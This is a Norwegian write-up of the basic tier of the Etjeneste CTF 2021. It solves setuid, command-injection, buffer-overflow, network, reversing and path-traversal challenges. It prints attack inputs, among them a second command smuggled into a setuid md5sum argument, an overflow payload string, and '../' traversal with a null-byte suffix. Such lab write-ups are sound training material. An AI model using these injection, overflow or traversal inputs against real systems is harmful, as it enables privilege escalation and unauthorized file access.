# Etjeneste CTF 2021

# 1_grunnleggende


## 1_scoreboard
Flagget nås ved `cat FLAGG`.

## 2_setuid
Flaggfilen eier vi ikke, men vi har en cat-kommando med setuid bit til den brukeren som eier filen. `./cat FLAGG`

## 3_injection
Binaryen *md5sum* har et setuid-bit satt for eieren av FLAGG. Vi kan kjøre `./md5sum "FLAGG; cat FLAGG"` for å få programmet til å kjøre to kommandoer som eieren av *md5sum*, `./md5sum FLAGG; cat FLAGG`

## 4_overflow
Vi ser at c-koden til binaryen bruker *strcpy()*, som lar oss overflowe bufferet som lagrer inputen vår. Vi kan også se at variabelen *above* må ha verdien "ABCDEFGH", før vi kan hoppe til adressen til shellkoden.
```bash
./overflow $(python3 -c "print('A'*40 + 'ABCDEFGH' + 'A'*24 + '000000')")
```

## 5_nettverk
Flagget kommer etter man har kommunisert med en server.
```python
import socket
import struct
import select

TCP_IP = "127.0.0.1"
TCP_PORT = 10015

def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((TCP_IP, TCP_PORT))
    print(conn.recv(4096).decode("utf-8"))

    a = []
    for i in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TCP_IP, TCP_PORT))
        a.append(s)
    print(conn.recv(4096).decode("utf-8"))

    sum = 0
    for b in range(len(a)):
        data = a[b].recv(4096)
        value = struct.unpack('>I',data)
        sum += value[0]

    conn.send(bytearray(struct.pack('>I', sum)))
    print(conn.recv(4096).decode("utf-8"))
    list = []
    while True:
        try:
            ready,_,_ = select.select(a, [], [], 10.0)
            for sock in ready:
                tpl = sock.recv(4096).decode("utf-8")
                list.append(tpl[0])
        except:
            break
    print("".join(list))

if __name__ == "__main__":
    main()
```

## 6_reversing
Ved å reversere filen *check_password* kan man se at:
- Passordet må være 32 bytes langt
- At de første 19 bokstavene er *Reverse_engineering*
- De neste bokstavene er *_er_* (hex tall gjort om til ascii)
- Slutter med bokstavene *morsomt__*
Strengen blir til slutt `Reverse_engineering_er_morsomt__`

Med Ghidra ser *check_password* slik ut:

![reversing](6_reversing.png)

## 7_path_traversal
Vi har et binary som leser filer i et directory som heter *bok*. Vi kan bruke path-traversal til å hoppe tilbake ett directory for å lese FLAGG-filen.
`./les_bok ../FLAGG`

### Bonusflagg
Det er et bonus flagg også. Vi kan se i c-koden til *les_bok* at det legges til en *.txt* på teksten vi sender som argument (fila vi vil lese). Vi kan terminere stringen før *.txt* blir lagt til med en url-enkodet null-byte, og lese flagget på samme måte som forrige.
`./les_bok ../BONUS_FLAGG%00`
